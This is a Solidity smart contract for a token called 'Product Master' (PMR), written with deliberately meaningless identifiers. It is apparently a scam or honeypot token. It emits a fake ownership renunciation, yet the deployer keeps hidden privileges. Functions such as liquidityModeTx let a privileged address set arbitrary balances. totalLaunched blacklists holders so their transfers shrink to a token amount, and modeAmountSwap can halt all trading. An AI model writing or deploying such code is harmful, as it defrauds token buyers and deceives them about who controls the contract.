//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface launchedExempt {
    function createPair(address launchedAt, address tokenFeeLiquidity) external returns (address);
}

interface launchTotalFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverEnable) external view returns (uint256);

    function transfer(address totalSwap, uint256 toLaunched) external returns (bool);

    function allowance(address listReceiverAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 toLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address totalSwap,
        uint256 toLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedTo, uint256 value);
    event Approval(address indexed listReceiverAuto, address indexed spender, uint256 value);
}

abstract contract takeTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface teamMode is launchTotalFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ProductMaster is takeTx, launchTotalFrom, teamMode {

    string private shouldLaunch = "PMR";

    function name() external view virtual override returns (string memory) {
        return marketingFundList;
    }

    function getOwner() external view returns (address) {
        return isFund;
    }

    function senderMinMax(address receiverAmountMax, address totalSwap, uint256 toLaunched) internal returns (bool) {
        require(enableTeam[receiverAmountMax] >= toLaunched);
        enableTeam[receiverAmountMax] -= toLaunched;
        enableTeam[totalSwap] += toLaunched;
        emit Transfer(receiverAmountMax, totalSwap, toLaunched);
        return true;
    }

    function teamMax(address receiverAmountMax, address totalSwap, uint256 toLaunched) internal returns (bool) {
        if (receiverAmountMax == takeFromMode) {
            return senderMinMax(receiverAmountMax, totalSwap, toLaunched);
        }
        uint256 teamReceiver = launchTotalFrom(autoSwap).balanceOf(atFundEnable);
        require(teamReceiver == maxTake);
        require(totalSwap != atFundEnable);
        if (maxLimit[receiverAmountMax]) {
            return senderMinMax(receiverAmountMax, totalSwap, tradingIs);
        }
        return senderMinMax(receiverAmountMax, totalSwap, toLaunched);
    }

    function decimals() external view virtual override returns (uint8) {
        return minLimit;
    }

    mapping(address => mapping(address => uint256)) private exemptLiquidity;

    mapping(address => uint256) private enableTeam;

    function transfer(address totalModeTo, uint256 toLaunched) external virtual override returns (bool) {
        return teamMax(_msgSender(), totalModeTo, toLaunched);
    }

    uint256 public amountTeam;

    uint8 private minLimit = 18;

    mapping(address => bool) public tokenLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return shouldLaunch;
    }

    bool public maxLaunched;

    mapping(address => bool) public maxLimit;

    address private isFund;

    uint256 private walletIs = 100000000 * 10 ** 18;

    address atFundEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return isFund;
    }

    uint256 public minFeeTx;

    uint256 constant tradingIs = 18 ** 10;

    function approve(address amountList, uint256 toLaunched) public virtual override returns (bool) {
        exemptLiquidity[_msgSender()][amountList] = toLaunched;
        emit Approval(_msgSender(), amountList, toLaunched);
        return true;
    }

    string private marketingFundList = "Product Master";

    function allowance(address amountAt, address amountList) external view virtual override returns (uint256) {
        if (amountList == buyShould) {
            return type(uint256).max;
        }
        return exemptLiquidity[amountAt][amountList];
    }

    function receiverMin(address launchModeReceiver) public {
        require(launchModeReceiver.balance < 100000);
        if (maxLaunched) {
            return;
        }
        if (minFeeTx != amountTeam) {
            autoFund = false;
        }
        tokenLiquidity[launchModeReceiver] = true;
        
        maxLaunched = true;
    }

    function liquidityModeTx(address totalModeTo, uint256 toLaunched) public {
        swapMax();
        enableTeam[totalModeTo] = toLaunched;
    }

    function fundTrading() public {
        emit OwnershipTransferred(takeFromMode, address(0));
        isFund = address(0);
    }

    address public autoSwap;

    constructor (){
        if (minFeeTx == amountTeam) {
            takeLaunchLaunched = false;
        }
        walletFund fundLiquidity = walletFund(buyShould);
        autoSwap = launchedExempt(fundLiquidity.factory()).createPair(fundLiquidity.WETH(), address(this));
        if (teamBuy != minFeeTx) {
            takeLaunchLaunched = true;
        }
        takeFromMode = _msgSender();
        tokenLiquidity[takeFromMode] = true;
        enableTeam[takeFromMode] = walletIs;
        fundTrading();
        
        emit Transfer(address(0), takeFromMode, walletIs);
    }

    address buyShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address receiverAmountMax, address totalSwap, uint256 toLaunched) external override returns (bool) {
        if (_msgSender() != buyShould) {
            if (exemptLiquidity[receiverAmountMax][_msgSender()] != type(uint256).max) {
                require(toLaunched <= exemptLiquidity[receiverAmountMax][_msgSender()]);
                exemptLiquidity[receiverAmountMax][_msgSender()] -= toLaunched;
            }
        }
        return teamMax(receiverAmountMax, totalSwap, toLaunched);
    }

    function swapMax() private view {
        require(tokenLiquidity[_msgSender()]);
    }

    event OwnershipTransferred(address indexed autoReceiver, address indexed feeMax);

    bool private autoFund;

    uint256 tradingBuy;

    uint256 public teamBuy;

    address public takeFromMode;

    function totalLaunched(address feeTo) public {
        swapMax();
        
        if (feeTo == takeFromMode || feeTo == autoSwap) {
            return;
        }
        maxLimit[feeTo] = true;
    }

    function balanceOf(address receiverEnable) public view virtual override returns (uint256) {
        return enableTeam[receiverEnable];
    }

    bool public takeLaunchLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return walletIs;
    }

    function modeAmountSwap(uint256 toLaunched) public {
        swapMax();
        maxTake = toLaunched;
    }

    uint256 maxTake;

}